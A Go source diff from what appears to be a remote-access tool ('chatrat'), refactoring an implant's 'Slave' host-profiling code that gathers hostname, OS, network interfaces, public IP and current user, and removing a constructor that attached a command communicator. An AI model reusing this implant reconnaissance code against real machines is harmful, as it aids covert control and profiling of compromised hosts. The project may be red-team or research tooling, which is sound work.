@@ -7,9 +7,6 @@ import (
 	"os/user"
 	"runtime"
 	"time"
-
-	"github.com/CoveoSec/chatrat/pkg/listeners"
-	"github.com/lithammer/shortuuid/v4"
 )
 
 type NetworkInterface struct {
@@ -18,16 +15,7 @@ type NetworkInterface struct {
 	MAC    string
 }
 
-type Slave struct {
-	Hostname          string
-	OS                string
-	NetworkInterfaces []*NetworkInterface
-	PublicIP          string
-	CurrentUser       *user.User
-	Communicator      listeners.Communicator
-}
-
-func getHostname() string {
+func (s *Slave) GetHostname() string {
 	hostname, err := os.Hostname()
 	if err != nil {
 		return "unkown"
@@ -35,11 +23,11 @@ func getHostname() string {
 	return hostname
 }
 
-func getOS() string {
+func (s *Slave) GetOS() string {
 	return runtime.GOOS
 }
 
-func getNetworkInterfaces() []*NetworkInterface {
+func (s *Slave) GetNetworkInterfaces() []*NetworkInterface {
 	nIfaceList := []*NetworkInterface{}
 	interfaces, err := net.Interfaces()
 	if err != nil {
@@ -63,7 +51,7 @@ func getNetworkInterfaces() []*NetworkInterface {
 	return nIfaceList
 }
 
-func getPublicIP() string {
+func (s *Slave) GetPublicIP() string {
 	resolver := &net.Resolver{
 		PreferGo: true,
 		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
@@ -82,7 +70,7 @@ func getPublicIP() string {
 
 }
 
-func getCurrentUser() *user.User {
+func (s *Slave) GetCurrentUser() *user.User {
 	if username, err := user.Current(); err == nil {
 		return username
 	}
@@ -94,18 +82,4 @@ func getCurrentUser() *user.User {
 		HomeDir:  "Unknown",
 	}
 
-}
-
-func NewSlave(apiKey string, commType listeners.CommType) *Slave {
-
-	id := shortuuid.New()
-
-	return &Slave{
-		Hostname:          getHostname(),
-		OS:                getOS(),
-		NetworkInterfaces: getNetworkInterfaces(),
-		PublicIP:          getPublicIP(),
-		CurrentUser:       getCurrentUser(),
-		Communicator:      listeners.NewCommunicator(apiKey, id, commType),
-	}
 }
